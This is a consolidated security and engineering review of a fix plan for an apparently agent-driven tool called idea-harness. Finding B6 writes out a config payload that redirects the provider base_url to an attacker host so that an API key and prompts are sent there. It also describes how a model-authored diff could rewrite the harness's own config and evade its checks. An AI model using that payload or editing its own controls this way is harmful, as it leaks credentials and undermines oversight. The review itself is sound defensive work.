# DX Audit Fix Plan — Adversarial Review Record

Five independent reviewers evaluated [`docs/plans/dx-audit-fix-plan.md`](./dx-audit-fix-plan.md) at
its pre-review draft (`38a77f6`). Each read the plan *and* the source tree to verify its claims.
This file records the consolidated findings and their dispositions. The plan text at v2 supersedes
anything contradicted here.

## Reviewers

| Perspective | Verdict | Blocking findings (summary) |
|---|---|---|
| CTO / principal architect | **reject** | Track A's dichotomy is false (compile gate and install gate are separable); `splitArgs` cannot represent the CLI's real flags; caching design is a stale-asset bug; a `version` constant already exists |
| Staff Quality | approve_with_changes | No CLI test harness exists and `connect()` spawns the test binary; `internal/cli` does not compile on a clean checkout, so tracks 1–3 cannot run their own tests; Track C misses the `advance`/`execute` leak path; freshness check is vacuous for added files |
| Staff Security | approve_with_changes | Stable asset names + long TTL on a fixed loopback port is a cache-poisoning path to the per-install token; `no-cache` writes that token to disk; freshness check attests consistency, not provenance; Track D validates the wrong fields |
| Staff SRE / release | approve_with_changes | No-Node CI job unenforceable as specified; module path does not resolve, so no tag makes `go install` work; no release automation; Track A's gate has no forcing function |
| Staff DX (standards) | **reject** | Two hard gates not actually closed; `UNEXPLAINED_ERROR` only partially closed; the highest-weighted area (time to first value, 20) is untouched; Track B ships a breaking change five steps before the changelog exists |

**Net verdict: reject — the plan must be amended before implementation.** Two reviewers would reject
as written, and the three "approve_with_changes" reviewers raised overlapping blocking findings.
Every finding below was re-verified in this worktree before disposition.

## The meta-finding

The plan's *diagnoses* held up on re-verification — every defect it names is real. Its *remedies* did
not. Three reviewers independently reached the same structural conclusion:

> `.gitignore:20` + `//go:embed dist` (`internal/web/web.go:12`) means **no Go package that transitively
> imports `internal/web` compiles on a clean checkout.** `internal/cli` → `internal/daemon`
> (`server.go:14`) → `internal/web`. So the plan's own constraint §3 — `go vet ./...` and
> `go test ./...` green before each commit — is unsatisfiable for six of its nine sequenced steps,
> because the fix that makes them satisfiable is sequenced last.

The plan then defended that ordering with a false dichotomy: *"Either those bytes are in the repo, or
every Go build depends on a Node toolchain."* There are two gates, not one, and they separate cleanly:

- **compile gate** — `go build` / `go test` / `go vet` work with no Node. Closable **today**, touching
  only `.gitignore`, `internal/web/`, and README prose. No overlap with `web/src` or
  `web/vite.config.ts`, therefore no collision with the UI redesign in flight.
- **install gate** — `go install` yields the *real* UI. Needs the real bytes and legitimately waits.

The plan's "main tension" — highest severity sequenced last — was self-inflicted.

## Consolidated blocking findings → resolution

**B1 — Split Track A; the compile gate goes first.** (architect 3, quality 2, SRE 7, DX 1)
**Resolution:** adopted. Track A1 (commit a minimal `internal/web/dist/`, switch to
`//go:embed all:dist`, drop `.gitignore:20`, fix the README claim) moves to sequence 1 and unblocks
every other track's test loop. Track A2 (real built assets, vite config, caching, the two new CI
jobs) stays after the redesign merges, with a dated fallback (B14). This is *not* the "placeholder
stub" the draft rejected: A1 makes no HTTP-200 claim, and A2's jobs still gate the real artifact.

**B2 — `splitArgs(args) (positional, map[string]string)` cannot represent this CLI's flags.**
(architect 2, quality 4) Verified against real code: `--doc` is **repeatable** and accumulates into a
slice (`internal/cli/cli.go:253-258`); `--doc=`, `--kind=`, `--title=` accept the **`=` form**
(`cli.go:259`, `docs.go:92-95`); value-taking flags are indistinguishable from booleans by prefix
alone (`--kind`/`--image`/`--model` take values, `--yes`/`--smoke` do not — `change.go:300-322`;
`--pass` boolean vs `--note` value — `change.go:402-411`). Under the draft's rule, the *value* in
`--kind omp` classifies as a positional and flows into `resolveInitiative` — reintroducing the P1
inside its own fix. `scripts/smoke.sh:108` (`verify REQ-1 --pass --note "smoke"`) and
`executor_setup_test.go:16-18` would both go red.
**Resolution:** adopted. Per-command flag spec (`name → bool | string | repeated`) consumed by one
parser. `cmdNew` (`cli.go:250-262`) already implements exactly this shape by hand — the spec
generalizes existing practice rather than inventing a convention. Item B4 of the draft ("an error
naming the command's accepted flags") has no registry to enumerate without it.

**B3 — `why` / `impact` / `trace` need arity-aware slicing.** (architect 1)
`runTraceCmd` consumes `args[0]`/`args[1]` as type and reference and passes `args[2:]`
(`internal/cli/advance.go:195-201`). Handing it the full positional slice would start resolving
initiative id `"task"` — a fresh instance of the bug, exercised by `smoke.sh:71,73` on every CI run.
**Resolution:** adopted; the work item now states per-call-site positional arity.
**Disagreement recorded:** the reviewer says this call site "does not inherit the defect." It does —
`idea why requirement REQ-1 --json` was *observed* exiting 1 with `sql: no rows in result set`,
because `args[2:]` still carries the flag. Both statements are true of different halves: the site
slices positionals correctly and passes flags through. The correction is adopted either way.

**B4 — Track C's choke point does not cover the paths the plan itself cites.** (quality 3, architect 7)
`idea advance` — the state-changing case the plan leads with — leaks through `handlers.go:241-244`
(500 + raw text) from `runtime.go:387`; same shape at `runtime.go:423` and `handlers.go:1143`. None
pass through the three helpers. Additionally: `changeSetRefError` returns a **`string`** while the
helpers return `error` (an unscoped signature change); direct `pr.db.Get*` calls bypass all three
helpers at `handlers.go:143, 1143, 1195, 1211`; and "~10 callers" undercounts the helpers' 24 call
sites. Finally, mapping the *message* does nothing about the *status code*, so the draft's item 3
("not-found is 404") depends on Track F, sequenced six steps later.
**Resolution:** adopted. Map at the store boundary (or one shared not-found wrapper) covering
`runtime.go:387,423,492` and the direct handler lookups; move F's status-code half into C so the two
land together; enumerate the direct call sites in the work item.

**B5 — Track D would reject configurations the product documents and tests as valid.** (DX 6, security B4/B5)
`ResolveProvider` deliberately defaults non-preset providers to OpenAI-compatible
(`internal/config/providers.go:70-73`), `providers_test.go:36-38` asserts it, and
`docs/configuration.md:51-79` + `README.md:148` document exactly that pattern for Groq, Together, and
LM Studio. "Unknown provider = error" as drafted breaks them.
**Resolution:** adopted. The check is scoped to `Presets ∪ configured providers`, and extended per
B6 to `harness.executor.model` and `harness.models[*]`, plus `base_url` validation on the write path.

**B6 — Three product-level security findings escape the plan's scope entirely.** (security B4, B5)
Verified in this tree:
1. **Provider-key scavenging.** `internal/workflow/execute.go:59-64` — for a bare or unknown provider
   the executor falls back to "the first preset key actually present in the environment", and
   `internal/executor/agent.go:14-20,140-152` forwards that key into a container that
   *deliberately* has network egress (`--network none` intentionally omitted). A typo'd
   `executor.model` hands an unrelated provider's real key to an agent the operator did not intend to
   fund. It should fail closed.
2. **`base_url` override of a preset provider.** `handleUpdateProviders` (`handlers.go:283-334`)
   stores `pc.BaseURL`/`pc.APIKeyEnv` unvalidated, and `buildRegistry` (`runtime.go:704-705`)
   registers them over preset defaults. `{"providers":{"openai":{"base_url":"https://attacker.tld/v1"}}}`
   passes every existing check — `rejectSecrets` (`config.go:172-174`) rejects inline secrets, and a
   URL is not a secret — then ships `OPENAI_API_KEY` and full prompt context to that host.
3. **`.idea-harness/**` sits inside the ChangeSet-writable surface.** `fsdiff.Snapshot`
   (`internal/fsdiff/fsdiff.go:45-78`) walks the project root with no skip list, so a model-authored
   diff can edit `harness.yaml` — `providers.*.base_url`, `network`, `executor.kind`,
   `build_cmd`/`test_cmd`, `git_commit` — carrying no credential and no path escape, tripping neither
   `secret_sweep` nor `path_escape` in `docs/security-model.md`. The compensating control is the human
   review gate, which is real but is exactly the kind of diff a reviewer skims.
**Resolution:** adopted as a new **Track S**, sequenced ahead of the cosmetic work. (3) needs a
product decision, not just a patch: either `.idea-harness/**` is excluded from the apply surface, or
the risk is documented and accepted in `docs/security.md`'s threat table. The plan records the
question; the call is the maintainer's.

**B7 — The caching design is invalid on three counts.** (architect 4, security B1/B2)
`Cache-Control: max-age` is a duration and cannot be "keyed off the build stamp". `internal/web/web.go:22`
serves assets from an `embed.FS`, whose entries carry **zero modtimes**, so `http.ServeContent` emits
neither `Last-Modified` nor `ETag` — conditional revalidation is unavailable. And with content hashes
removed, `/assets/index.js` is a stable URL whose bytes change every release, so a long TTL serves the
previous release's bundle after an upgrade.

The security half is sharper. The daemon binds a **fixed** `127.0.0.1:8787` (`client.go:21`), and the
browser cache is keyed on origin — an origin idea-harness shares with every other local dev server
that has ever bound that port. `internal/web/web.go:39` substitutes the per-install token into
`index.html` as a `<meta>` tag, and the repo sets **no Content-Security-Policy anywhere**. A
long-lived cache entry for a stable asset path on a shared loopback origin is therefore a path to
the daemon's only credential. Separately, `no-cache` still permits writing that token-bearing
document to disk.
**Resolution:** adopted, and the draft's design is reversed. **Keep vite's content hashes.** Merge
conflicts in generated bundles are handled with `.gitattributes` (`internal/web/dist/** -diff -merge`)
plus a regenerate-after-merge rule in CONTRIBUTING — not by making cache keys stable. `index.html`
gets `Cache-Control: no-store, must-revalidate`. A CSP ships in the same commit as A2.

**B8 — The freshness check is vacuous, non-deterministic, and fails open.** (quality 6/7, architect 5, security B3, SRE 6)
`git diff --exit-code` does not see **untracked** files, so a build emitting a new chunk passes green
(`Makefile:11` does `rm -rf` + `cp -r`). `Makefile:10` runs `pnpm install` **without**
`--frozen-lockfile` (contrast `ci.yml:58` for the `web` job), `web/package.json` uses caret ranges and
has **no `packageManager` field**, so resolution can drift and rewrite the lockfile. And the check
attests only that `dist` is a faithful build of the *committed lockfile* — it proves nothing about
whether that lockfile was reviewed, which is the malicious-dependency case it was meant to defend.
Committing `dist` also pins any compromised bundle into the immutable module proxy once a tag exists.
**Resolution:** adopted in full. `git status --porcelain -- internal/web/dist` must be empty;
`pnpm install --frozen-lockfile` in `embed-web` with a separate `web-deps-update` target; add
`packageManager`; explicit `"pnpm": {"onlyBuiltDependencies": []}` so re-enabling install scripts is a
reviewable diff; pin the job to one runner; add `permissions:` to `ci.yml` (currently absent) and a
`CODEOWNERS` entry over `internal/web/dist/`, `web/package.json`, `web/pnpm-lock.yaml`. **The draft's
escape hatch — "downgrade it from a gate to a warning" — is struck.** A supply-chain control that
fails open is not a control.

**B9 — The test harness the plan assumes does not exist, and writing one naively forks the test binary.**
(quality 1/5/9) `connect()` (`cli.go:326-339`) → `ensureDaemon()` (`client.go:162-189`) runs
`os.Executable()` with arg `daemon` — under `go test` that is the **test binary**, so each command in
the proposed table spawns a detached copy and polls 50×100ms before failing. The two existing tests
avoid this only by never reaching `connect()` (`executor_setup_test.go:10-11` says so;
`docs_test.go:19` hand-builds a `client`). Against an empty project most commands take the
"No tasks yet" branch, so a naive table would pass `json.Valid` while exercising nothing; seeding
through the real async workflow costs ~9s and blows the 12s suite budget.
**Resolution:** adopted. New **Track T** — an `httptest`-backed client seam plus a store-level fixture
builder — is a named deliverable sequenced **before** B, C, and D, not "the harness they share"
mentioned after them. `cmdWatch` terminates in a Bubble Tea program and is excluded from the table
with its arg resolution extracted to a pure function. "Exit 0" is restated as `err == nil`; exit-code
semantics live in `cmd/idea/main.go:12-15` and need a built-binary subprocess test if they are in scope.

**B10 — The version story is wrong in its premise and impossible in its distribution.** (architect 8, SRE 3/4/5, security N3)
A version already exists: `const version = "0.1.0"` (`internal/daemon/handlers.go:27`), served at
`GET /api/v1/version` (`routes.go:7`). The plan claimed none, and proposed "two sources, one command"
which with this constant is three. Worse, `go.mod:1` declares `module github.com/idea-harness/idea-harness`
while `origin` is `devarispbrown/idea-harness` — so `go install <module>@v0.1.0` cannot work no matter
what is tagged. `go install ./cmd/idea` from a checkout stamps `vcs.revision` and `vcs.modified`
(a dirty tree must surface as `-dirty` or the command lies); the module-proxy form stamps
`Main.Version` and **no** VCS data. There is no release automation anywhere in `.github/workflows/`.
**Resolution:** adopted. Track G now: replaces the existing constant (one stamp, read by both
`idea version` and `handleVersion`); states the three build paths and which stamp wins in each;
decides the module path question explicitly — either fix `go.mod` to a reachable path or state in
README that the module-path form is unsupported; adds `-trimpath` and CI-built release binaries
before any tag (a laptop build embeds the maintainer's home path, readable via `go version -m`).

**B11 — Track B ships a breaking change five steps before the changelog exists.** (DX 5)
`idea plan --json` and `idea verify --json` go from "exit 0, flag ignored" to a JSON envelope or an
explicit error. Sequenced at #1; `CHANGELOG.md` arrives at #6. That is the literal failure condition
of `UNDOCUMENTED_BREAKING_API` (P0), self-inflicted by the plan's own ordering.
**Resolution:** adopted. `CHANGELOG.md` is created **first**, before any behavior change, and every
track that alters observable behavior adds its entry in the same commit.

**B12 — The plan cannot claim it converts FAIL to PASS.** (DX 3/4/7/8)
Time to first value carries the highest weight (20) and **no track touches it** — the magic path stays
at 13 commands against a target of 8, and the default outcome stays synthetic. Track I documents and
measures the real path, but per the standards an estimate cannot prove a PASS, and a `workflow_dispatch`
job is CI-observed only on runs someone triggers. The API area (weight 15) gets its status codes fixed
while its structural defects are deferred without a date. Effort concentrates on Release/compat (7),
Documentation (10), and CLI/config (10).
**Resolution:** partially adopted, honestly. A new **Track V** takes on the command count directly
(`idea next` already knows the sequence; the question is whether `idea new` should drive to the first
human gate). The plan's claim is **downgraded**: completing it clears the two named hard gates and the
`--json` contract, which moves the verdict off FAIL — it does not by itself produce a high Overall DX,
and the plan no longer says it does. Track I's framing is corrected: it makes the real path *measurable*,
not *default*.

**B13 — The no-Node CI job is unenforceable as specified.** (SRE 1)
GitHub `ubuntu-latest` ships Node on `PATH` via the hosted toolcache regardless of `setup-node`, so
"PATH scrubbed" with no mechanism can pass while `node` is still reachable.
**Resolution:** adopted. The job runs in a Node-free container (`golang:1.25-bookworm`) and asserts
`! command -v node` and `! command -v pnpm` before building. Daemon startup uses a scratch
`IDEA_HARNESS_STATE`/`IDEA_HARNESS_ADDR` and polls for health with a deadline rather than sleeping.

**B14 — Track A2 has no forcing function.** (SRE 7, DX 1)
"That call is the user's, not this plan's" leaves the audit's top gate open indefinitely.
**Resolution:** adopted. With B1's split, A1 closes the compile gate immediately and A2 carries a
dated checkpoint: if the UI redesign has not merged by **2026-09-16**, A2 proceeds against `main` and
the redesign rebases.

**B15 — `scripts/smoke.sh` citations were wrong and the "correct" poll pattern is not correct.**
(architect nb, quality nb) Fixed sleeps are at lines **52, 67, 78, 85** and an uncited `sleep 1` at
**102** — the draft said 56/66/74/82. The health loops the draft cited as already-correct
(`:25-28`, `:45-48`) never fail on timeout; they fall through and the next command errors with an
unrelated message. `:85` is the real race (the `test -f hello.txt` at `:87` runs before the git poll),
and `:102` has no positive signal to wait on — absence is not observable, so it must poll
`idea change CHG-1` until it reports reverted, then assert absence.
**Resolution:** adopted, with corrected line numbers and a `|| { echo …; exit 1; }` on every converted
poll. `routes.go` nested routes are lines 25-29, not 26-30.

## Non-blocking findings adopted

- `//go:embed dist` → `//go:embed all:dist` before committing generated output; the current directive
  silently drops `.`/`_`-prefixed files, a footgun the moment `web/public/` appears. (architect)
- `idea plan <initiative>` and `idea export` ignore the initiative entirely — `explain_export.go:76-97`
  picks the last artifact in the *project* matching `kind`. A real multi-initiative correctness bug
  the draft's "pass positionals through" would have masked. Filed, not scheduled. (architect)
- `docs/cli.md:3` states the `--json` contract Track B is fixing; Track E must correct that sentence,
  not just add a generated table. (architect)
- `client.go:137-140` (`doRaw`) prints `daemon: <raw body>`, bypassing the `{"error":…}` decode — a
  second `sql:` leak path, reachable via `idea prd`/`idea export`, that Track C's test would trip over.
  Now scheduled inside C. (quality)
- Track C's "no error contains `sql:`" is a substring blocklist; it passes on
  `unable to open database file: /Users/<name>/…`. 5xx bodies become a generic message plus a
  correlation id, with detail logged server-side, and the test asserts *shape*. (security N1)
- Reflected references are control-character-stripped and truncated (~64 chars) before reaching a
  terminal; `main.go:13` writes daemon strings straight to stderr. The web UI is not at risk — no
  `dangerouslySetInnerHTML` in `web/src/`, and `writeError` JSON-encodes. (security N2)
- Track I measures with `SECONDS`, emits only the number, and never publishes `daemon.log`
  (`agent-smoke.sh:35`) — model output can carry secrets outside the redactor's catalog. Add
  `permissions: contents: read` and `persist-credentials: false` to the `agent` job. (security N4/N5)
- `docs/security.md`'s threat table gains rows for the UI asset-cache/origin boundary,
  `providers.*.base_url` as an egress destination, and `.idea-harness/**` as ChangeSet-writable.
  (security N6)
- `colorEnabled` (`style.go:30-38`) is a package global that defaults false only because no test
  passes an `*os.File`; the harness sets it explicitly. (quality)
- Track G's smoke regex is unanchored and matches almost any hex token; anchor it and assert the
  `-dirty` marker. (SRE 9, quality)
- macOS CI: GitHub macOS runners have no Docker, so `internal/executor/sandbox_test.go:16-19` and
  `internal/workflow/execute_test.go:292,324` skip. Track H must name the darwin-specific failure mode
  it is buying or drop the matrix entry. (SRE 2, architect, quality)

## Disagreements recorded, not resolved by fiat

1. **`README.md:180` and `docs/architecture.md:22`.** The architect calls them accurate (a layout table
   and a stack row, both true post-build); the documentation audit called them reinforcement of the
   false "already embeds" claim. **Disposition:** keep the edit, downgrade it from a correctness fix
   to a wording clarification. Neither reviewer's position is unreasonable and the cost is one line each.
2. **Content hashes.** The architect calls the merge-conflict argument for stable names "weak";
   security independently requires hashes for cache-key safety. **Disposition:** hashes stay. The two
   arguments agree on the outcome by different routes.
3. **Whether `runTraceCmd` "inherits" the flag defect.** See B3. Recorded because the observed
   behavior and the source reading disagree in emphasis, and the plan should not pretend they don't.

## What would settle the open question

Track S item 3 (`.idea-harness/**` inside the apply surface) is a product decision this review cannot
make. It is settled by one of: excluding the config directory from `fsdiff.Snapshot`'s walk and
proving it with a test that a change set touching `harness.yaml` is rejected; or a documented,
dated acceptance in `docs/security.md` naming the human review gate as the compensating control.
